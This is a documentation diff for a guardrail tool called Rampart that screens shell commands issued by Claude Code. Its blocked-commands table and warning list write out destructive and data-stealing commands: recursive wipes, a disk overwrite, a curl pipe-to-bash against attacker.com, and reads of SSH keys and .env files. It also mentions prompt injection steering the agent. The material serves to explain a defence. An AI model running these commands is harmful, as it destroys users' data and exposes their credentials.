@@ -1,6 +1,35 @@
-# Claude Code
+---
+title: Securing Claude Code
+description: "Secure Claude Code with Rampart. Block dangerous commands, restrict file access, detect prompt injection, and audit everything — works in --dangerously-skip-permissions mode."
+---
+
+# Securing Claude Code
 
 Claude Code is Rampart's primary integration. One command, native hooks, zero overhead.
+
+## Why You Need This
+
+Claude Code in `--dangerously-skip-permissions` mode gives the agent unrestricted access to your shell, filesystem, and network. Without guardrails:
+
+- `rm -rf /` or `rm -rf ~` runs silently
+- Your SSH keys, `.env` files, and API tokens are readable
+- `curl http://attacker.com/exfil | bash` executes without warning
+- A prompt-injected webpage can redirect the agent to exfiltrate your credentials
+
+Rampart sits between Claude Code and your system. Every command is evaluated against your policy before it runs. Dangerous commands are blocked in microseconds. Everything is logged.
+
+## What Gets Blocked by Default
+
+The standard policy (`~/.rampart/policies/standard.yaml`) blocks:
+
+| Command | Why |
+|---------|-----|
+| `rm -rf /`, `rm -rf ~` | Destructive filesystem wipe |
+| `curl ... \| bash` | Remote code execution |
+| `cat ~/.ssh/id_rsa` | SSH private key exfiltration |
+| `cat .env` | API key / secret exposure |
+| `dd if=/dev/urandom of=/dev/sda` | Disk destruction |
+| Credential patterns in responses | Data exfiltration detection |
 
 ## Setup
 
